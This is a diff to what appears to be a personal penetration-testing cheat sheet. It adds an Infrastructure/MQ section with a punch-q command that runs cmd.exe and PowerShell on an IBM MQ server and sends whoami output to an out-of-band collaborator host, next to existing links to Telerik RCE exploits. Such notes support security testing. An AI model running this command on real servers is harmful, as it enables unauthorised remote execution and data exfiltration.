@@ -17,6 +17,7 @@ for my private purposes :)
    + [SQL Injection](#sql-injection)
    + [PHP](#php)
    + [ASP.NET](#aspnet)
+- [Infrastructure](#infrastructure)
 - [Network](#network)
 - [/dev/null](#devnull)
 - [Unix filesystem](#unix-filesystem)
@@ -239,6 +240,10 @@ $ cat test1234.txt | base64
  - RCE Telerik https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui?utm_campaign=190101_Posts_Blog&utm_source=Caleb%20-%20Github
  - https://github.com/noperator/CVE-2019-18935
  - https://github.com/Illuminopi/RCEvil.NET/    
+
+## Infrastructure
+### MQ
+```punch-q --config ../../../config.yml command execute --cmd "cmd.exe" --args '/c "powershell.exe $i=whoami; Invoke-WebRequest -uri http://kdjsfhkjsdhfjsd.burcpollaborator.xyz/$i"'```
 
 ## Network  
 ### Lookup and display the route for a destination  
